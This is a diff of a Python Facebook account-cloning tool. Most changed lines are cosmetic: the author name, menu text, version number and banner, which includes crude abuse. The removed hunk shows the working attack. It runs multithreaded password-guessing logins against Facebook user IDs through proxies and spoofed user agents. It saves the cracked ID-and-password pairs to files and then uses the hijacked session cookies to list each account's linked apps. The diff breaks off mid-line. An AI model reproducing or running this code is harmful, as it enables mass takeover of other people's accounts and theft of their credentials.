@@ -153,7 +153,7 @@ else:
 def clear():
 	os.system('clear')
 #------------------[ MAIN ]-----------------#
-print("\033[1;37m [\u001b[36m•\033[1;37m] THANKS FOR USING \033[1;37m")
+print("\033[1;37m [\u001b[36m•\033[1;37m] THANKS FOR USING! \033[1;37m")
 #------------------[ MACHINE-SUPPORT ]---------------#
 
 def restart():
@@ -184,11 +184,11 @@ logo ="""░██████╗██╗░░░██╗██████�
 ->[----------------------------------------------------------------]<-    
 \033[1;37m×->\033[1;32mFUCK YOU BEACH->SURAJ-YOUR->DADDY\033[1;37m                                                     
 \033[1;37;1m-----------------------------------------------
- \033[1;36m[•] AUTHOR -> \033[1;37m     -> \033[1;37m×->\033[1;32mSURAJ-VHUSAL\033[1;37m
+ \033[1;36m[•] AUTHOR -> \033[1;37m     -> \033[1;37m×->\033[1;32mSURAJ-DADDY\033[1;37m
  \033[1;36m[•] GITHUB -> \033[1;37m    ->  \033[1;37m×->\033[1;32mSURAJGODEXE\033[1;37m
- \033[1;36m[•] FACEBOOK -> \033[1;37m  -> : \033[1;37m×->\033[1;32mSU RAJ LUVS YOUU\033[1;37m
+ \033[1;36m[•] FACEBOOK -> \033[1;37m  -> : \033[1;37m×->\033[1;32mSU RAJ VHUSAL\033[1;37m
  \033[1;36m[•]TOOL/ -> \033[1;37m   ->  \033[1;97m : \x1b[97m\033[37;41m PAID\033[0;m
- \033[1;36m[•] VERSION -> \033[1;37m   ->  \033[1;36m3.3 \033[1;37m
+ \033[1;36m[•] VERSION -> \033[1;37m   ->  \033[1;36m3.5 \033[1;37m
   
 -----------------------------------------------"""
 #-----------------------[ API ]--------------------#
@@ -267,7 +267,7 @@ def setting():
     linex()
     print(" [\u001b[36m1\033[1;37m] ONLY OLD IDZ")
     print(" [\u001b[36m2\033[1;37m] ONLY NEW IDZ")
-    print(" [\u001b[36m3\033[1;37m] BOTH MIX IDZ (RECOMMENDED)")
+    print(" [\u001b[36m3\033[1;37m] BOTH MIX IDZ(recommend)")
     linex()
     hu = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
     if hu in ['1','01']:
@@ -294,7 +294,7 @@ def setting():
     print(" [\u001b[36m•\033[1;37m] LOGIN METHOD ")
     linex()
     print(" [\u001b[36m1\033[1;37m] METHOD 1 (BEST)")
-    print(" [\u001b[36m2\033[1;37m] METHOD 2(UPDATED)")
+    print(" [\u001b[36m2\033[1;37m] METHOD 2")
     linex()
     hc = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
     linex()                              
@@ -305,7 +305,7 @@ def setting():
     print(" [\u001b[36m•\033[1;37m] CHECKPOINT ID OPTIONS ")
     linex()
     print(" [\u001b[36m1\033[1;37m] SHOW CP ACCOUNTS")
-    print(" [\u001b[36m2\033[1;37m] HIDE SHOW CP ACCOUNTS")
+    print(" [\u001b[36m2\033[1;37m] HIDE CP ACCOUNTS")
     linex()
     saurab = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
     if saurab in ['y','Y','111','01','11','1']:
@@ -316,7 +316,7 @@ def setting():
     print(" [\u001b[36m•\033[1;37m] COOKIE OPTIONS")
     linex()
     print(" [\u001b[36m1\033[1;37m] SHOW COOKIES")
-    print(" [\u001b[36m2\033[1;37m] DON'T SHOW COOKIES")
+    print(" [\u001b[36m2\033[1;37m] HIDE SHOW COOKIES")
     linex()
     saurav = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
     linex()                              
@@ -335,7 +335,7 @@ def passwrd():
     print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
     print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m',str(len(id)))
     linex()
-    print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE EVERY 5 MINUTES ')
+    print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE AFTER 5 MINUTES ')
     linex()
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -418,14 +418,14 @@ def passwrd():
     print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     linex()
     woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
-    os.system("python KESHAV.py")
+    os.system("python run.py")
     exit() 
 #--------------------[ METODE-B-API ]-----------------#
  
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r \u001b[37m[K3SH9V-DON] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
+	sys.stdout.write(f"\r \u001b[37m[SURAJ-DON] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -511,67 +511,4 @@ def crackfree(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			ses.headers.update({"Host":"m.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
-			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={"Host":"www.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
-			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{P}{K} [{time.strftime("K3SH9V")}-CP] {idf} │ {pw} {P}')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
-				cp+=1
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{P}{H} [{time.strftime("SURAJ")}-OK] {idf} │ {pw} {P}')
-				cek_apk(kuki)
-				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				jones(idf,pw,kuki)
-				ok.append(wrt)
-				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-	
-#----------------[ ID-CHECKER ]--------------------------#
-
-def cek_apk(kuki):
-	session = requests.Session()
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
-	except AttributeError:
-		print ("\r    %s\033[0m cookie invalid"%(M))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
-	except AttributeError:
-		print ("\r    %s \033[0mcookie invalid"%(M))
-#-----------------------[ SYSTEM-CONTROL ]--------------------#
-
-if __name__=='__main__':
-	try:os.mkdir('OK')
-	except:pass
-	try:os.mkdir('CP')
-	except:pass
-	try:os.mkdir('data')
-	except:pass
-	try:os.system('touch .prox.txt')
-	except:pass
-	menu()
-
+			ses.headers.update({"Host":"m.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"co
